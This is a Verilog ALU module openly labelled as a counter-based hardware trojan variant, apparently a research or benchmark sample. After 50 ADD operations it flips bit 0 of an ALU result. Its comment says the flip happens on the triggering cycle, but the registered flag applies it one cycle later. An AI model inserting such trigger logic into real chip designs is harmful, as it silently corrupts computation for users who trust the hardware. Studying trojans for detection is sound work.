// ALU_trojan_seq.v  - Sequential (Counter-Based) Trojan Variant
// Trojan definition:
//   Counter  : increments every clock cycle where op == ADD (4'b0010)
//   Trigger  : counter reaches THRESHOLD (50 by default)
//   Payload  : on the triggering cycle, XOR ADD result with 32'h00000001
//              counter resets to 0 after triggering
//
// Interface change vs clean ALU:
//   ADDED  input clk
//   ADDED  input rst
// PipelineCPU_trojan_seq.v passes these from the top-level ports

module ALU_seq (
    input clk,
    input rst,
    input  [3:0]  ALUCtl,
    input  [31:0] A, B,
    output [31:0] ALUOut,
    output zero
);

    localparam THRESHOLD = 10'd50;   // trigger after 50 ADD operations

    reg [31:0] alu_comb;
    always @(*) begin
        case (ALUCtl)
            4'b0000: alu_comb = A & B;
            4'b0001: alu_comb = A | B;
            4'b0010: alu_comb = A + B;
            4'b0110: alu_comb = A - B;
            4'b0011: alu_comb = A ^ B;
            4'b0100: alu_comb = A << B[4:0];
            4'b0101: alu_comb = A >> B[4:0];
            4'b0111: alu_comb = $signed(A) >>> B[4:0];
            4'b1000: alu_comb = ($signed(A) < $signed(B)) ? 32'b1 : 32'b0;
            4'b1001: alu_comb = (A < B) ? 32'b1 : 32'b0;
            default: alu_comb = 32'b0;
        endcase
    end

    reg [9:0]  trojan_counter;
    reg        trojan_active;

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            trojan_counter <= 10'd0;
            trojan_active  <= 1'b0;
        end
        else if (ALUCtl == 4'b0010) begin   // counting ADD operations
            if (trojan_counter == THRESHOLD) begin
                trojan_active  <= 1'b1;     // fire payload this cycle
                trojan_counter <= 10'd0;    // reset for next round
            end else begin
                trojan_counter <= trojan_counter + 10'd1;
                trojan_active  <= 1'b0;
            end
        end
        else begin
            trojan_active <= 1'b0;          // non-ADD: no activation
        end
    end

    assign ALUOut = trojan_active ? (alu_comb ^ 32'h00000001) : alu_comb;
    assign zero   = (ALUOut == 32'b0);

endmodule